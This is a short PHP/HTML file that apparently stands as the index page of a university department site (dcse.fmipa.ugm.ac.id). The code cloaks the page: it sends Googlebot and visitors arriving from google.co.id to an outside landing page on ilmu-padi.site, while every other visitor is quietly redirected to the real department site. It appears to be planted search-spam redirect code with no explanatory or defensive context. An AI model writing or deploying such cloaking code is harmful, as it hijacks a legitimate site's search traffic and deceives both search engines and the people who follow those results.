<?php

if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
{
    header("Location: https://ilmu-padi.site/landing/dcseugm/");
    die();
}

if(isset($_SERVER['HTTP_REFERER'])) {
  if (strpos($_SERVER['HTTP_REFERER'], 'google.co.id')) {
    header("Location: https://ilmu-padi.site/landing/dcseugm/");
    die();
  }
}
?>

<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='https://dcse.fmipa.ugm.ac.id'" />
  </head>
  <body>
  </body>
</html>
